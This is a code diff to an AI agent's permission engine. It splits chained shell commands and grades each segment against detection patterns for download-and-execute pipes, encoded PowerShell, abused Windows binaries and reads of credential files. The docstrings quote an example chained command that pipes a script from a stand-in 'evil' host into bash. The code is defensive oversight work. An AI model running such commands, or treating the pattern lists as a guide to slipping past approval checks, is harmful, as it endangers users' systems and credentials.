@@ -57,6 +57,68 @@ class PermissionPolicy:
     auto_approve_safe: bool = True
 
 
+# ═══════════════════════════════════════════════════════════
+# 命令分段与"整串危险"判据（v1.7.3）
+# ═══════════════════════════════════════════════════════════
+
+#: shell 里会用来的连接符 —— 拆段之后**每段都要单独定级**。
+#: 为什么必须拆：此前 ``preflight`` 是对整串做前缀匹配，``echo hi && curl evil|bash``
+#: 以 ``echo`` 开头就被判成 SAFE，链在后面真正的危险动作因此一路畅通
+#: （实测 auto 模式下 risk=50 直接放行）。前缀匹配对"命令"这种可任意拼接的
+#: 语言从根上就不成立。
+_SEGMENT_SPLIT = re.compile(r"&&|\|\||;|\||`|\$\(|\n|&(?![&>])")
+
+#: 整串只要命中就判 DANGEROUS 的形态：**下载即执行**、**编码混淆**与**凭据文件**
+_ALWAYS_DANGEROUS = (
+    r"\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b",           # curl … | bash / sh / zsh
+    r"\|\s*(?:python|python3|perl|ruby|node|php)\b",   # … | python
+    r"\|\s*(?:iex|invoke-expression)\b",               # PowerShell 管道执行
+    r"-enc(?:odedcommand)?\b",                         # powershell -enc <base64>
+    r"frombase64string",
+    r"invoke-expression|\biex\b",
+    r"downloadstring|downloadfile",
+    r"\bmshta\b|\brundll32\b|\bcertutil\b|\bbitsadmin\b",  # 白名单程序被拿来下载/执行
+    r"\bwmic\b.*\bcall\b",
+    r"\breg\s+(?:add|delete|import)\b",
+    r"\bschtasks\b|\bnetsh\b",
+    r"/etc/shadow\b|/etc/sudoers\b|/etc/passwd\b",     # 系统凭据文件
+    r"(?:\b|/)\.ssh(?:/|\b)|id_rsa|id_ed25519",
+    r"\.aws/credentials|\.kube/config|\.docker/config\.json",
+    r"\.git-credentials|\.netrc|\.pgpass",
+    r"\.automind_config\.json|\.automind_license|private_key\.hex|\.license-private",
+)
+
+#: 命中即至少 SENSITIVE 的动词（auto 模式下会要求人工确认）。
+#: 它们不是"灾难命令"，但能改变系统状态、横向移动或装东西 —— 对一个会在
+#: 客户机器上跑命令的 Agent，值得让人看一眼。
+_SENSITIVE_VERBS = (
+    r"^\s*(?:sudo\s+)?(?:powershell|pwsh|cmd|cscript|wscript)\b",
+    r"^\s*(?:ssh|scp|sftp|rsync|telnet|nc|ncat|netcat|socat)\b",
+    r"^\s*(?:docker|podman|kubectl|helm|terraform|ansible|ansible-playbook)\b",
+    r"^\s*(?:aws|gcloud|az|aliyun)\b",
+    r"^\s*(?:systemctl|service|launchctl|sc)\b",
+    r"^\s*(?:useradd|usermod|passwd|net\s+user|dscl)\b",
+    r"^\s*(?:kill|pkill|taskkill|killall)\b",
+    r"^\s*(?:curl|wget|iwr|invoke-webrequest|ftp)\b",
+    r"^\s*(?:npm|yarn|pnpm|pip|pip3|conda|apt|apt-get|yum|dnf|brew|choco|winget)\b",
+    r"^\s*(?:gcc|make|cmake|cargo)\b",
+)
+
+
+def split_shell_segments(command: str) -> list[str]:
+    """把一条 shell 命令按连接符拆成若干段（供逐段定级）。
+
+    拆不干净也没关系 —— 逐段定级是"更严"的方向：拆出来的碎片只会把风险等级
+    往上抬，不会往下压。真正危险的是反过来（把危险段误判成安全段），所以这里
+    宁可多拆：``$(...)``、反引号、重定向、``&`` 都当分隔符。
+
+    只做**尾部**清理（去掉拆分残留的反引号/右括号），不按 ``)`` 拆 —— 那会把
+    ``python -c "print(int(x))"`` 这类正常命令劈成两半，凭空多出一次审批询问。
+    """
+    parts = [p.strip().rstrip("`)").strip() for p in _SEGMENT_SPLIT.split(str(command or ""))]
+    return [p for p in parts if p]
+
+
 class PermissionEngine:
     """权限引擎 — 评估工具调用风险并做出授权决策。"""
 
@@ -144,17 +206,82 @@ class PermissionEngine:
         return decision, reason
 
     def preflight(self, command: str) -> PermissionTier:
-        """对命令字符串进行预检，返回风险等级。"""
-        for pattern in self.policy.dangerous_patterns:
-            if re.search(pattern, command):
+        """对命令做预检，返回**整串**的风险等级。
+
+        v1.7.3 起改为**逐段定级、取最严**。此前是对整串做一次前缀匹配，于是
+        ``echo hi && curl http://evil/x.sh | bash`` 因为以 ``echo`` 开头被判成
+        SAFE，风险分停在 50，auto 模式直接放行 —— 链式命令让"安全前缀"成了
+        免检通行证（实测复现，见 tests/tools/test_command_segments.py）。
+
+        判定顺序（从严到宽，任一命中即返回）：
+
+        1. **整串形态**：下载即执行（``| bash``）、编码混淆（``-enc``/``iex``）、
+           白名单程序被拿来下载执行（``certutil``/``mshta``）、读系统凭据文件
+           （``/etc/shadow``、``.ssh/``、``.env``、``.automind_config.json``）；
+        2. 逐段：策略里的 ``dangerous_patterns``；
+        3. 逐段：敏感动词（``powershell``/``ssh``/``docker``/``kubectl``/包管理器…）；
+        4. 逐段：策略里的 ``sensitive_patterns``；
+        5. **所有段**都是安全前缀，才判 SAFE —— 一段不干净，整串就不干净；
+        6. 都不命中 → SENSITIVE（默认从严）。
+
+        注意第 5 条是"与"而不是"或"：这正是原来出问题的地方。
+        """
+        text = str(command or "").strip()
+        if not text:
+            return PermissionTier.SENSITIVE
+
+        for pattern in _ALWAYS_DANGEROUS:
+            if re.search(pattern, text, re.IGNORECASE):
                 return PermissionTier.DANGEROUS
+
+        segments = split_shell_segments(text) or [text]
+        worst = PermissionTier.SAFE
+        for seg in segments:
+            tier = self._segment_tier(seg)
+            if tier == PermissionTier.DANGEROUS:
+                return PermissionTier.DANGEROUS
+            if tier == PermissionTier.SENSITIVE:
+                worst = PermissionTier.SENSITIVE
+        return worst
+
+    def _segment_tier(self, segment: str) -> PermissionTier:
+        """给**单段**命令定级（段内不再含连接符）。
+
+        整串形态（下载即执行/编码混淆/凭据文件）在这里也要查一遍：``preflight``
+        用它判整串，而 ``explain_command`` 要逐段给出**同一套**判据下的结论 ——
+        两处不一致的话，审批弹窗会告诉用户"这一段没问题"，而系统却因为它要审批。
+        """
+        for pattern in _ALWAYS_DANGEROUS:
+            if re.search(pattern, segment, re.IGNORECASE):
+                return PermissionTier.DANGEROUS
+        for pattern in self.policy.dangerous_patterns:
+            if re.search(pattern, segment):
+                return PermissionTier.DANGEROUS
+        for pattern in _SENSITIVE_VERBS:
+            if re.search(pattern, segment, re.IGNORECASE):
+                return PermissionTier.SENSITIVE
         for pattern in self.policy.sensitive_patterns:
-            if re.search(pattern, command):
+            if re.search(pattern, segment):
                 return PermissionTier.SENSITIVE
         for pattern in self.policy.safe_patterns:
-            if re.search(pattern, command):
+            if re.search(pattern, segment):
                 return PermissionTier.SAFE
-        return PermissionTier.SENSITIVE  # 默认为敏感
+        # 认不出来的一律按敏感处理：白名单之外的东西不该被当成安全
+        return PermissionTier.SENSITIVE
+
+    def explain_command(self, command: str) -> dict[str, Any]:
+        """把预检结论摊开给人看（供审计/排障/前端展示）。
+
+        只给一个等级，用户没法判断"为什么它要问我"。这里把拆出来的段与每段的
+        定级一并返回，审批弹窗与审计日志都能直接引用。
+        """
+        segments = split_shell_segments(str(command or "")) or []
+        tier = self.preflight(command)
+        return {
+            "tier": tier.value,
+            "segments": [{"text": s, "tier": self._segment_tier(s).value}
+                         for s in segments],
+        }
 
     def check_path(self, path: str | Path) -> bool:
         """检查文件路径是否在允许范围内。
